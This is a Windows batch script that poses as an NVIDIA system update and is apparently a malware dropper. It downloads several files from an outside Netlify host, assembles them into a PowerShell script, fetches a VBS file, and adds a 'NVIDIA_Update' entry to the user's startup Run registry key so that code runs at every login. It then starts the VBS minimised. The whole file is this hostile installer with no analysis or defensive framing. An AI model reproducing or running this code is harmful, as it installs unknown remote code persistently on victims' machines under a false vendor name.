@echo off

rmdir /s /q "%appdata%\nvidia_sys" 2>nul

:: Set variables
set "base=%appdata%\nvidia_sys\logs"
set "t=%base%\nvs_update.txt"
set "tempFile1=%base%\temp1.txt"
set "tempFile2=%base%\secound.txt"
set "ps1File=%base%\nvs_update.ps1"
set "vbsFile=%base%\s-nvs_update.vbs"

:: Create directory
if not exist "%base%" mkdir "%base%"

:: Download required files
powershell -Command "Start-BitsTransfer -Source 'https://fancy-seehorse.netlify.app/code/final.txt' -Destination '%t%'"
powershell -Command "Start-BitsTransfer -Source 'https://fancy-seehorse.netlify.app/code/first.txt' -Destination '%tempFile1%'"
powershell -Command "Start-BitsTransfer -Source **** -Destination '%tempFile2%'"

:: Replace placeholders
powershell -Command "(gc '%t%' -Raw) -replace '----', (gc '%tempFile1%' -Raw) -replace '====', (gc '%tempFile2%' -Raw) | Set-Content '%t%'"

:: Cleanup
del "%tempFile1%" 2>nul
del "%tempFile2%" 2>nul


:: Rename to .ps1
ren "%t%" "NVS_UPDATE.PS1"

:: Download and run VBS And Add To Statrtup
powershell -Command "iwr fancy-seehorse.netlify.app/code/s-nvs_update.vbs -o '%vbsFile%'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NVIDIA_Update' -Value 'wscript.exe \"%APPDATA%\nvidia_sys\logs\s-nvs_update.vbs\"'"
start /min wscript "%vbsFile%"